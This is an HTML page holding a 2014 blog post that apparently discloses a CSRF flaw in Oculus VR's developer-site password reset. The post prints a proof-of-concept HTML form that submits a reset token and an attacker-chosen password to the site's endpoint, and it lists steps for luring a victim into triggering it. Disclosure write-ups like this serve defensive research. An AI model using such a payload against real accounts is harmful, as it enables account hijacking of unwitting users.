<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>
    
      OCULUS VR account hijacking via password reset vulnerability &middot; .adrian{}
    
  </title>

  <link rel="stylesheet" href="/styles.css">
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">
  <link rel="alternate" type="application/atom+xml" title=".adrian{}" href="/atom.xml">
  <script type="text/javascript" src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-569b61df7d055f6e&async=1" async="async"></script>
  <script type="text/javascript" src="/public/pace/pace.min.js"></script>

  <link rel="stylesheet" type="text/css" href="/public/pace/flat_top.css">
  
  <link rel="stylesheet" type="text/css" href="/public/style.css">
   <script type="text/javascript" src="/public/aa.js"></script>
   
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

    
    
</head>


  <body>
    
    <header class="masthead">
        <h3 class="masthead-title">
          
          <ul class="topnav">
           <li>
            <a href="/" title="Home">Home</a>
           
          </li>
            
            
            
              &nbsp;&nbsp;&nbsp;
              <li><a href="/about">About</a></li>
            
              &nbsp;&nbsp;&nbsp;
              <li><a href="/archive">Archive</a></li>
            
              &nbsp;&nbsp;&nbsp;
              <li><a href="/atom.xml">Feed</a></li>
            
            
              <li class="icon">
                <a href="javascript:void(0);" onclick="myFunction()">&#9776; Menu</a>
              </li>
            
            
            </ul>
          
          
          
        </h3>
      </header>
    <div class="container content">

      

      <main>
        <article class="post">
  <h1 class="post-title">OCULUS VR account hijacking via password reset vulnerability</h1>
  <time datetime="2014-08-15T00:00:00+00:00" class="post-date">15 Aug 2014</time>
  <p>Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, a head-mounted display for immersive virtual reality(VR). In March 2014,Facebook agreed to acquire Oculus VR for US$2 billion in cash and Facebook stock.</p>

<p>While testing the forgot password functionality of oculusVR .I have found that itâ€™s possible to abuse this functionality.
Here is a algorithm how the reset password functionality of oculus VR works.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">if (user is log in){
//the app will not use auth parameter which is a reset password passcode. Then change the password of the user who is currently log in.

}
else{
//if the user is not log in ,oculus uses the auth parameter to identify which account to be reset.

}</code></pre></figure>

<p><img src="https://4.bp.blogspot.com/-tAuAQSsCwO4/U_LD_b0AOnI/AAAAAAAAAQs/hotORflSwzY/s1600/check1.png" alt="passw" />
<code class="highlighter-rouge">Although I am log in, password reset page still can be viewed.</code></p>

<p>The main problem here is oculusVR does not have a ANTI-CSRF token on
reset password functionality. :) the only need to hijack a oculusVR account is a valid reset password link token.
Combining the CSRF vulnerability and weird behaviour of password reset page will be resulted to <strong>Account Hijacking vulnerability</strong></p>

<h3 id="sample-csrf-poc">Sample CSRF PoC</h3>

<figure class="highlight"><pre><code class="language-text" data-lang="text">&lt;body&gt;
&lt;form action="https://developer.oculusvr.com/core/UserAction.php" method="POST"&gt;
&lt;input type="hidden" name="action" value="changepassword" /&gt;
&lt;input type="hidden" name="auth" value="your_reset_token" /&gt;
&lt;input type="hidden" name="newpassword" value="attackerpassword" /&gt;
&lt;input type="hidden" name="confirmpassword" value="attackerpassword" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;/body&gt;</code></pre></figure>

<p>To get the value of auth parameter you must request a reset password link on this link https://developer.oculusvr.com/lostpassword.</p>

<h3 id="hack-steps">HACK STEPS</h3>
<ul>
  <li>Attacker requests a reset password link</li>
  <li>Makes a CSRF PoC attack with reset token</li>
  <li>Sends the csrf poc link to his victim</li>
  <li>If the victim clicks that link his password will be changed!</li>
</ul>

</article>
<div class="addthis_native_toolbox"></div>


<aside class="related">
  <h3>Related posts</h3>
  <ul class="related-posts">
    
    
      <li>
        <a href="/2016/01/01/whats-jekyll/">
          What's Jekyll?
          <small><time datetime="2016-01-01T00:00:00+00:00">01 Jan 2016</time></small>
        </a>
      </li>
    
      <li>
        <a href="/2014/07/26/Flowdock-XSS-or-RCE/">
          Flowdock XSS or RCE(malicious file upload)
          <small><time datetime="2014-07-26T00:00:00+00:00">26 Jul 2014</time></small>
        </a>
      </li>
    
      <li>
        <a href="/2014/05/07/leaking-anti-CSRF-token-of-yandex!/">
          Bypass anti CSRF token of Yandex!
          <small><time datetime="2014-05-07T00:00:00+00:00">07 May 2014</time></small>
        </a>
      </li>
    
    
  </ul>
</aside>


<div id="disqus_thread"></div>
<script>
/**
* RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
* LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
*/

var disqus_config = function () {
this.page.url = document.location; // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = "/2014/08/15/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability/"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};

(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');

s.src = '//adrianswebsecurityblog.disqus.com/embed.js';

s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>


      </main>

      <footer class="footer">
        <small>
          <div class='social'>
    


    <a title='Twitter' href="https://twitter.com/nukesec">
      <i class="fa fa-twitter-square fa-2x"></i> 
    </a>





    <a title='Github' href="https://github.com/deadstar1">
      <i class="fa fa-github-square fa-2x"></i> 
    </a>





    <a title='Hackerone' href="https://hackerone.com/adrian">
      <i class="fa fa-bug fa-2x"></i> 
    </a>




    <a title='Bugcrowd' href="https://bugcrowd.com/mochocho101">
      <i class="fa fa-bug fa-2x"></i>
    </a>


</div>
<<<<<<< HEAD
          &copy; <time datetime="2016-03-28T05:20:20+00:00">2016</time>. All rights reserved. Independent Style.
=======
          &copy; <time datetime="2016-03-28T05:12:50+00:00">2016</time>. All rights reserved. Independent Style.
>>>>>>> cleanup

            
        </small>
      </footer>
    </div>

    
     <script>
       (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
       (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
       m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
       })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
       ga('create', 'UA-75403295-1', 'auto');
       ga('send', 'pageview');
     </script>
    
  </body>
</html>
